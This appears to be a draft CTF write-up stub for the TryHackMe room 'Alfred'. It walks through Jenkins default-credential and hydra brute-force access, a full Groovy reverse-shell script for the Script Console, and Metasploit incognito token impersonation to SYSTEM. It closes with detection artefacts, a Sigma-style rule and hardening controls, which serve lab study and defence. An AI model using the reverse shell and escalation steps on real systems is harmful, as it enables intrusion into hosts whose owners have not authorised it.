---
title: "WriteUp: Alfred — TryHackMe | Easy"
slug: writeup-thm-alfred
status: draft
tags: [ctf-writeup, tryhackme, teaser]
excerpt: "An easy Windows machine covering Jenkins default credentials, Groovy console RCE, and token impersonation. Full walkthrough in preparation."
format: html  # body is Ghost-ready HTML; restore via Admin API posts?source=html
---

<h1 id="alfred-%E2%80%94-tryhackme">Alfred — TryHackMe</h1><blockquote><strong>Preparation stub.</strong> Based on publicly documented information about this retired room — not an<br>original solve, and no live flag values are recorded. Complete the bracketed fields when working<br>the room under your own account. Only document legally authorised activity.</blockquote><h2 id="engagement-metadata">Engagement metadata</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Platform</td>
<td>TryHackMe</td>
</tr>
<tr>
<td>Room</td>
<td>Alfred</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Easy</td>
</tr>
<tr>
<td>Category</td>
<td>Windows</td>
</tr>
<tr>
<td>Target IP</td>
<td>10.x.x.x (lab-assigned)</td>
</tr>
<tr>
<td>Date completed</td>
<td>[YYYY-MM-DD]</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="executive-summary">Executive summary</h2><p>A Windows host running <strong>Jenkins</strong> with weak/default credentials. The Jenkins <strong>Script Console</strong><br>(Groovy) is abused for remote code execution and a reverse shell, then <strong>token impersonation</strong><br>(abusing <code>SeImpersonatePrivilege</code>) escalates to SYSTEM. Teaches CI/CD exposure and Windows<br>privilege-token abuse.</p><h2 id="scenario-value-study-scaffold">Scenario value (study scaffold)</h2><ul><li><strong>What it tests:</strong> recognising an exposed CI/CD system (Jenkins) as RCE-as-a-feature, and Windows<br>privilege escalation via <code>SeImpersonatePrivilege</code>.</li><li><strong>What completing it demonstrates:</strong> web-foothold-to-SYSTEM on Windows — Groovy Script Console RCE<br>to a reverse shell, then token impersonation (Incognito / Potato family), and the <code>whoami /priv</code><br>discipline (MITRE T1078 → T1059 → T1134.001).</li></ul><h2 id="key-vulnerability-class">Key vulnerability class</h2><ul><li><strong>Foothold:</strong> <strong>Jenkins</strong> exposed with weak/default credentials → authenticated <strong>Groovy Script</strong><br><strong>Console RCE</strong> (CWE-1188 insecure default / CWE-78 command execution via an admin feature). This is<br>a <em>configuration/exposure</em> issue, not a single CVE.</li><li><strong>Privesc:</strong> <strong>token impersonation</strong> via <strong><code>SeImpersonatePrivilege</code></strong> held by the service account —<br>the classic "Potato" family (e.g. Incognito token-stealing / JuicyPotato-style) to obtain a SYSTEM<br>token (CWE-269 improper privilege management).</li></ul><h2 id="1-reconnaissance">1. Reconnaissance</h2><pre><code>nmap -sC -sV -p- -oA nmap/alfred 10.x.x.x
</code></pre><p>Expected exposed surface (confirm on completion):</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>80/tcp</td>
<td>http</td>
<td>Decoy/landing web page</td>
</tr>
<tr>
<td>3389/tcp</td>
<td>ms-wbt-server</td>
<td>RDP (often present)</td>
</tr>
<tr>
<td>8080/tcp</td>
<td>http (Jetty)</td>
<td><strong>Jenkins — the foothold</strong></td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>[Paste trimmed scan output on completion.]</p><p><strong>nmap flag rationale:</strong></p><ul><li><code>-p-</code> — all 65,535 TCP ports. Jenkins commonly hides on a non-standard high port; here the<br>decoy is port 80 and the real foothold is <strong>8080</strong> — <code>-p-</code> is what prevents tunnel vision on 80.</li><li><code>-sV</code> — version detection; the <code>Jetty</code> banner on 8080 is the tell that a Jenkins/Java app server<br>is present rather than the IIS/Apache the landing page implies.</li><li><code>-sC</code> — default scripts; <code>http-title</code> quickly distinguishes the decoy page from the Jenkins app.</li><li><code>-oA nmap/alfred</code> — keep evidence of both web ports.</li></ul><p><strong>What to look for in the scan:</strong> a <em>second</em> HTTP service on a high port (8080/Jetty) behind a<br>bland port-80 landing page. The decoy-plus-real-app pattern is common — always service-scan every<br>open HTTP port, not just 80/443.</p><h2 id="2-enumeration">2. Enumeration</h2><pre><code>whatweb http://10.x.x.x:8080/
# Browse to :8080 — confirm the Jenkins dashboard / login page
</code></pre><ul><li>Identify Jenkins on <strong>8080</strong>. Try weak/default credentials first (commonly <code>admin:admin</code>); if<br>those fail, brute-force the login form:</li></ul><pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.x.x.x http-form-post \
  "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid"
</code></pre><ul><li>[Record the working credential pair (do not publish if reused elsewhere).]</li></ul><p><strong>What to look for after web enumeration:</strong> the <strong>Jenkins version</strong> (footer of any page) and<br>whether the <strong>Script Console</strong> (<code>/script</code>) is reachable once authenticated. Default/weak admin<br>creds plus a reachable Groovy console <em>is</em> the exploit — no CVE hunting needed. If login is locked<br>down, pivot to checking for an exposed <code>/script</code> via an unauthenticated misconfig or a CVE for the<br>specific Jenkins build.</p><h2 id="3-exploitation-groovy-script-console-rce">3. Exploitation (Groovy Script Console RCE)</h2><p>The phases here: authenticate with weak/default creds <strong>[ATT&amp;CK T1078.001 — Valid Accounts:</strong><br><strong>Default Accounts]</strong> (or brute force, <strong>[ATT&amp;CK T1110.001 — Password Guessing]</strong>), then run Groovy<br>in the Script Console for code execution <strong>[ATT&amp;CK T1059 — Command and Scripting Interpreter]</strong>.</p><p>Navigate to <strong>Manage Jenkins → Script Console</strong> and run a Groovy reverse-shell one-liner. Set up a<br>listener first (<code>nc -lvnp 4444</code>), then:</p><pre><code class="language-groovy">String host="&lt;tun0 ip&gt;";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()&gt;0)so.write(pi.read());
  while(pe.available()&gt;0)so.write(pe.read());
  while(si.available()&gt;0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
</code></pre><ul><li>Alternatively host a <code>msfvenom</code> Windows payload and pull/execute it from the console.</li><li><strong>User flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="4-privilege-escalation-token-impersonation">4. Privilege escalation (token impersonation)</h2><pre><code>whoami /priv          # look for SeImpersonatePrivilege = Enabled
</code></pre><p>With <code>SeImpersonatePrivilege</code> enabled, impersonate SYSTEM <strong>[ATT&amp;CK T1134.001 — Access Token</strong><br><strong>Manipulation: Token Impersonation/Theft]</strong>. Metasploit Incognito path:</p><pre><code># upgrade the shell to meterpreter, then:
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid                # expect NT AUTHORITY\SYSTEM
</code></pre><ul><li>Non-Metasploit alternative: a Potato-family tool (JuicyPotato / PrintSpoofer depending on Windows<br>version) achieves the same SYSTEM escalation.</li><li><strong>Root/admin flag:</strong> <code>[capture on completion]</code> (on this room the root flag sits in the<br>Administrator profile and may need <code>type</code> over an absolute path).</li></ul><h2 id="5-tools-used">5. Tools used</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Phase</th>
<th>Tools</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon</td>
<td><code>nmap</code> (<code>-sC -sV -p-</code>)</td>
</tr>
<tr>
<td>Access</td>
<td>browser, <code>whatweb</code>, <code>hydra</code> (Jenkins login brute-force)</td>
</tr>
<tr>
<td>Exploitation</td>
<td>Jenkins Groovy Script Console; <code>nc</code>/<code>msfvenom</code> reverse shell</td>
</tr>
<tr>
<td>Privesc</td>
<td><code>whoami /priv</code>; meterpreter <code>incognito</code> (<code>impersonate_token</code>) / Potato-family tool</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK mapping</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Valid Accounts: Default Accounts</td>
<td>T1078.001</td>
</tr>
<tr>
<td>Credential Access</td>
<td>Brute Force: Password Guessing</td>
<td>T1110.001</td>
</tr>
<tr>
<td>Execution</td>
<td>Command and Scripting Interpreter</td>
<td>T1059</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>Access Token Manipulation: Token Impersonation</td>
<td>T1134.001</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="7-key-learnings">7. Key learnings</h2><ul><li><strong>CI/CD systems are high-value footholds</strong> — an exposed Jenkins with a Script Console is RCE-as-a-<br>feature; never expose Jenkins without auth and never leave default creds.</li><li><strong><code>SeImpersonatePrivilege</code> is a SYSTEM ticket</strong> — service accounts holding it are routinely<br>escalated via the Potato/Incognito techniques; always run <code>whoami /priv</code> early on Windows.</li><li><strong><code>whoami /priv</code> first</strong> — privilege enumeration is faster than blind kernel-exploit hunting.</li><li><strong>Pick the right Potato for the OS build</strong> — JuicyPotato works on older builds; PrintSpoofer/<br>RoguePotato cover patched ones. Know which applies before burning time.</li><li><strong>Blue-team transfer:</strong> MITRE <strong>T1078</strong> (default accounts), <strong>T1059</strong> (scripting), <strong>T1134</strong><br>(token manipulation); detect anomalous Jenkins console use and token-impersonation events.</li></ul><h2 id="8-defender-perspective-%E2%80%94-logs-detection">8. Defender perspective — logs &amp; detection</h2><p>What this attack looks like from a monitored SOC, and the rule that would catch it. (See<br><a href="../methodology/ctf-methodology.md">../methodology/ctf-methodology.md §7</a>.)</p><p><strong>Log artefacts generated:</strong></p><ul><li><strong>Jenkins audit log</strong> (<code>jenkins.log</code> / Audit Trail plugin): repeated failed logins followed by a<br>success (the brute force, <strong>T1110.001</strong>), then access to <strong><code>/script</code></strong> — Script Console use is<br>rare and high-privilege; the Audit Trail records the Groovy submission.</li><li><strong>Windows process telemetry (Sysmon ID 1):</strong> the Jenkins service (<code>java.exe</code>/<code>jenkins.exe</code>)<br>spawning <code>cmd.exe</code>/<code>powershell.exe</code> — an application server launching a shell is the headline<br>indicator (mirrors the Tomcat case in <em>Jerry</em>).</li><li><strong>Token impersonation (T1134.001):</strong> Windows Security <strong>Event ID 4624 logon type 9</strong><br>(<code>seclogo</code> / new-credentials) and <strong>4672</strong> (special privileges assigned) appearing for the<br>service account, plus <strong>4673/4674</strong> privileged-service calls. Potato-style attacks also generate<br>local RPC/named-pipe activity (<code>SeImpersonate</code> abuse).</li><li><strong>Network:</strong> outbound reverse shell from the Jenkins host.</li></ul><p><strong>Example detection logic (Sigma-style):</strong></p><pre><code class="language-yaml">title: Jenkins Script Console RCE → token impersonation
detection:
  rce:
    ParentImage|endswith: ['\java.exe', '\jenkins.exe']
    Image|endswith: ['\cmd.exe', '\powershell.exe']
  priv:
    EventID: 4672          # special privileges incl. SeImpersonatePrivilege
  condition: rce OR priv
level: high
</code></pre><p><strong>Why it fires:</strong> legitimate Jenkins almost never spawns an interactive shell, and a service<br>account suddenly being assigned SYSTEM-equivalent privileges (4672/4624 type 9) is the signature of<br>token theft. The CI/CD audit log catches the <em>foothold</em>, Sysmon + Security log catch the <em>RCE and</em><br><em>privesc</em>. Maps to <strong>ATT&amp;CK T1078.001 / T1110.001 / T1059 / T1134.001</strong>.</p><p><strong>Defensive controls:</strong> never expose Jenkins without authentication; remove default credentials and<br>enforce account lockout; restrict the Script Console to admins on a trusted network; run Jenkins as<br>a low-privilege account <em>without</em> <code>SeImpersonatePrivilege</code>; enable the Audit Trail plugin and ship<br>it to the SIEM.</p><h2 id="exam-relevance-%E2%80%94-sec-sy0-701">Exam relevance — Sec+ SY0-701</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>SY0-701 objective</th>
<th>How Alfred makes it concrete</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>2.4</strong> Indicators / password attacks</td>
<td>Default credentials (<code>admin:admin</code>) on an exposed admin console — the most-tested "you had one job" weakness in Domain 2.</td>
</tr>
<tr>
<td><strong>2.3</strong> Vulnerability types</td>
<td>An exposed management interface (Jenkins Script Console) is the "unnecessary service / misconfiguration exposed" vulnerability class.</td>
</tr>
<tr>
<td><strong>1.2 / 4.6</strong> AAA &amp; IAM</td>
<td>Windows token impersonation (<code>incognito</code>) defeats authentication by stealing an existing identity — the attacker's view of why the exam stresses access tokens and privilege.</td>
</tr>
<tr>
<td><strong>5.x</strong> Account / config policy</td>
<td>Changing default credentials and least-privilege service accounts are the governance controls Domain 5 asks about.</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p><strong>Interview line:</strong> "Alfred turns the exam's 'change default credentials' bullet into something<br>visceral — admin:admin on a CI server is full RCE, and the token-impersonation privesc is access<br>control taught from the attacker's chair."</p><h2 id="9-references">9. References</h2><ul><li>Jenkins Script Console RCE technique (configuration exposure, not a single CVE).</li><li>Potato / Incognito <code>SeImpersonatePrivilege</code> abuse references; PrintSpoofer.</li><li>MITRE ATT&amp;CK T1078.001, T1110.001, T1059, T1134.001.</li></ul>
